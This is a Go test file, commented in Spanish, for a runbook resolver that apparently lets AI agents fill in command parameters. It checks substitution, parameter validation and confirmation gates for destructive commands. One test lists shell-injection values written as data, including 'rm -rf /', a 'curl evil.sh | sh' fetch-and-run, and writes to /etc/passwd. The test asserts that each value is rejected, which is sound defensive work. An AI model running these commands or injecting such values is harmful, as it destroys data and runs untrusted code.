// Copyright 2026, Nexus Workbench
// SPDX-License-Identifier: Apache-2.0

package main

import (
	"regexp"
	"strings"
	"testing"
)

func TestRunbookParams(t *testing.T) {
	if got := RunbookParams("systemctl status <service>"); len(got) != 1 || got[0] != "service" {
		t.Fatalf("params = %v", got)
	}
	// repetido una sola vez, y ordenado para que el mensaje al agente sea estable
	got := RunbookParams("kubectl -n <namespace> logs <pod> -c <pod>")
	if len(got) != 2 || got[0] != "namespace" || got[1] != "pod" {
		t.Fatalf("params = %v", got)
	}
	if got := RunbookParams("docker ps"); got != nil {
		t.Fatalf("un comando sin placeholders no tiene params: %v", got)
	}
}

func TestResolveRunbookSubstitutes(t *testing.T) {
	rb := &Runbook{Id: "systemd-status", Command: "systemctl status <service>"}
	out, err := ResolveRunbook(rb, map[string]string{"service": "nexus-api"})
	if err != nil {
		t.Fatal(err)
	}
	if out != "systemctl status nexus-api" {
		t.Fatalf("resuelto = %q", out)
	}
}

func TestResolveRunbookRepeatsValueEverywhere(t *testing.T) {
	rb := &Runbook{Id: "x", Command: "kubectl -n <ns> get pods && kubectl -n <ns> get svc"}
	out, _ := ResolveRunbook(rb, map[string]string{"ns": "nexus"})
	if strings.Contains(out, "<ns>") {
		t.Fatalf("quedó un placeholder sin sustituir: %q", out)
	}
}

func TestResolveRunbookRequiresEveryParam(t *testing.T) {
	rb := &Runbook{Id: "journal", Command: "journalctl -u <service> -n <lines>"}
	_, err := ResolveRunbook(rb, map[string]string{"service": "sshd"})
	if err == nil {
		t.Fatal("un parámetro faltante tiene que ser error")
	}
	if !strings.Contains(err.Error(), "lines") {
		t.Fatalf("el error tiene que decir cuál falta: %v", err)
	}
}

func TestResolveRunbookRejectsUnknownParam(t *testing.T) {
	rb := &Runbook{Id: "systemd-status", Command: "systemctl status <service>"}
	_, err := ResolveRunbook(rb, map[string]string{"service": "sshd", "namespace": "otro"})
	if err == nil {
		t.Fatal("un parámetro que el runbook no declara tiene que ser error")
	}
}

// El runbook lo escribe el usuario, pero quien lo invoca con parámetros puede
// ser un agente: el valor no puede introducir estructura de shell.
func TestResolveRunbookRejectsShellInjection(t *testing.T) {
	rb := &Runbook{Id: "systemd-status", Command: "systemctl status <service>"}
	injections := []string{
		"sshd; rm -rf /",
		"sshd && curl evil.sh | sh",
		"sshd`whoami`",
		"sshd$(id)",
		"sshd | tee /etc/passwd",
		"sshd > /etc/hosts",
		"sshd\nrm -rf /",
		"sshd\\; rm",
	}
	for _, value := range injections {
		if _, err := ResolveRunbook(rb, map[string]string{"service": value}); err == nil {
			t.Errorf("aceptó una inyección: %q", value)
		}
	}
	// un nombre de servicio normal tiene que seguir pasando
	for _, value := range []string{"nexus-api", "sshd", "docker.service", "my_app@1"} {
		if _, err := ResolveRunbook(rb, map[string]string{"service": value}); err != nil {
			t.Errorf("rechazó un valor legítimo %q: %v", value, err)
		}
	}
}

func TestResolveRunbookRejectsEmptyParam(t *testing.T) {
	rb := &Runbook{Id: "x", Command: "systemctl status <service>"}
	if _, err := ResolveRunbook(rb, map[string]string{"service": "   "}); err == nil {
		t.Fatal("un parámetro vacío tiene que ser error")
	}
}

// Un runbook declarado destructive tiene que poder confirmarse, no quedar en un
// error sin salida.
func TestDestructiveRunbookIsConfirmable(t *testing.T) {
	app := &App{confirmer: MakeConfirmer(), audit: MakeAuditor(t.TempDir() + "/audit.jsonl")}
	lab := &Environment{Id: "rig3060", Kind: "ssh", Class: "lab", Criticality: "low"}
	cmd := "systemctl restart nexus-api"

	msg := app.gateFull("run_runbook", lab, cmd, "", EffectiveContext{}, true)
	if msg == "" {
		t.Fatal("un runbook destructivo tiene que pedir confirmación aunque el ambiente sea lab")
	}
	token := regexp.MustCompile(`confirm_token="([0-9a-f]{16})"`).FindStringSubmatch(msg)
	if token == nil {
		t.Fatalf("no devolvió un token usable: %s", msg)
	}
	if out := app.gateFull("run_runbook", lab, cmd, token[1], EffectiveContext{}, true); out != "" {
		t.Fatalf("el token no confirmó: %s", out)
	}
}

// Los patrones destructivos ahora aplican a cualquier tool que ejecute, no sólo
// a run_command.
func TestDestructivePatternsApplyToRunbooks(t *testing.T) {
	app := &App{confirmer: MakeConfirmer(), audit: MakeAuditor(t.TempDir() + "/audit.jsonl")}
	lab := &Environment{Id: "rig3060", Kind: "ssh", Class: "lab", Criticality: "low"}
	if msg := app.gateFull("run_runbook", lab, "kubectl delete ns staging", "", EffectiveContext{}, false); msg == "" {
		t.Fatal("un kubectl delete vía runbook tiene que escalar igual")
	}
}
